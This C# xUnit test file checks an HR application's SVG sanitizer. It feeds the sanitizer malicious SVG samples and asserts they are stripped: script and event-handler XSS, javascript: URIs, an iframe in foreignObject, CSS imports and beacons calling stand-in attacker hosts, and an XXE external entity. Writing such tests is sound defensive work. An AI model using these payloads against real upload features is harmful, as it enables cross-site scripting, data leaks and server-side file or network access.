using System.Text;
using Hrms.Application.Common;
using Xunit;

namespace Hrms.Tests;

public sealed class SvgSanitizerAndBrandingTests
{
    [Fact]
    public void SvgSanitizer_StripsScriptTag()
    {
        var maliciousSvg = @"<svg xmlns=""http://www.w3.org/2000/svg"" viewBox=""0 0 100 100"">
            <circle cx=""50"" cy=""50"" r=""40"" fill=""red"" />
            <script type=""text/javascript"">alert('pwned');</script>
        </svg>";

        var clean = SvgSanitizer.Sanitize(maliciousSvg);

        Assert.DoesNotContain("<script", clean, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("alert", clean, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("<circle", clean, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void SvgSanitizer_StripsInlineEventHandlers()
    {
        var maliciousSvg = @"<svg xmlns=""http://www.w3.org/2000/svg"" onload=""alert('xss')"" viewBox=""0 0 100 100"">
            <rect width=""100"" height=""100"" onclick=""evil()"" onmouseover=""bad()"" fill=""blue"" />
        </svg>";

        var clean = SvgSanitizer.Sanitize(maliciousSvg);

        Assert.DoesNotContain("onload", clean, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("onclick", clean, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("onmouseover", clean, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("alert", clean, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("<rect", clean, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void SvgSanitizer_StripsJavascriptUris()
    {
        var maliciousSvg = @"<svg xmlns=""http://www.w3.org/2000/svg"">
            <a href=""javascript:alert('xss')"">
                <text x=""10"" y=""20"">Click me</text>
            </a>
        </svg>";

        var clean = SvgSanitizer.Sanitize(maliciousSvg);

        Assert.DoesNotContain("javascript:", clean, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("alert", clean, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void SvgSanitizer_StripsForeignObject()
    {
        var maliciousSvg = @"<svg xmlns=""http://www.w3.org/2000/svg"">
            <foreignObject width=""100"" height=""100"">
                <iframe xmlns=""http://www.w3.org/1999/xhtml"" src=""https://evil.example.com""></iframe>
            </foreignObject>
            <circle cx=""50"" cy=""50"" r=""30"" fill=""green"" />
        </svg>";

        var clean = SvgSanitizer.Sanitize(maliciousSvg);

        Assert.DoesNotContain("foreignObject", clean, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("iframe", clean, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("<circle", clean, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void SvgSanitizer_PreservesValidSvgContent()
    {
        var validSvg = @"<svg xmlns=""http://www.w3.org/2000/svg"" width=""200"" height=""100"" viewBox=""0 0 200 100"">
            <defs>
                <linearGradient id=""g1"" x1=""0%"" y1=""0%"" x2=""100%"" y2=""100%"">
                    <stop offset=""0%"" stop-color=""#3b82f6"" />
                    <stop offset=""100%"" stop-color=""#1d4ed8"" />
                </linearGradient>
            </defs>
            <rect width=""200"" height=""100"" rx=""10"" fill=""url(#g1)"" />
            <text x=""20"" y=""50"" fill=""#ffffff"" font-family=""Inter"">Acme Corp</text>
        </svg>";

        var clean = SvgSanitizer.Sanitize(validSvg);

        Assert.Contains("<rect", clean, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("<text", clean, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("linearGradient", clean, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("Acme Corp", clean, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void SvgSanitizer_StripsMaliciousStyleTagWithImportAndUrl()
    {
        var maliciousSvg = @"<svg xmlns=""http://www.w3.org/2000/svg"">
            <style>
                @import url('https://attacker.com/evil.css');
                body { background: url('https://attacker.com/leak'); }
            </style>
            <circle cx=""10"" cy=""10"" r=""5"" />
        </svg>";

        var clean = SvgSanitizer.Sanitize(maliciousSvg);

        Assert.DoesNotContain("<style", clean, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("@import", clean, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("attacker.com", clean, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("<circle", clean, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void SvgSanitizer_StripsExternalUseHref()
    {
        var maliciousSvg = @"<svg xmlns=""http://www.w3.org/2000/svg"">
            <use href=""https://evil.example.com/exploit.svg#icon"" />
            <circle cx=""20"" cy=""20"" r=""10"" />
        </svg>";

        var clean = SvgSanitizer.Sanitize(maliciousSvg);

        Assert.DoesNotContain("<use", clean, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("evil.example.com", clean, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("<circle", clean, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void SvgSanitizer_StripsExternalAndDataImageHref()
    {
        var maliciousSvg = @"<svg xmlns=""http://www.w3.org/2000/svg"">
            <image href=""https://evil.com/beacon.png"" width=""10"" height=""10"" />
            <image href=""data:image/svg+xml;base64,PHN2Zz4="" width=""10"" height=""10"" />
            <rect width=""50"" height=""50"" fill=""blue"" />
        </svg>";

        var clean = SvgSanitizer.Sanitize(maliciousSvg);

        Assert.DoesNotContain("beacon.png", clean, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("data:image", clean, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("<rect", clean, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void SvgSanitizer_RejectsDtdAndEntityExpansion()
    {
        var xxeSvg = @"<?xml version=""1.0"" standalone=""no""?>
        <!DOCTYPE svg [
          <!ELEMENT svg ANY >
          <!ENTITY % sp SYSTEM ""http://evil.example.com/dtd"">
          %sp;
        ]>
        <svg xmlns=""http://www.w3.org/2000/svg"">
            <text>test</text>
        </svg>";

        var clean = SvgSanitizer.Sanitize(xxeSvg);

        // DtdProcessing.Prohibit causes XML parser exception, returning empty sanitized output
        Assert.True(string.IsNullOrEmpty(clean));
    }
}
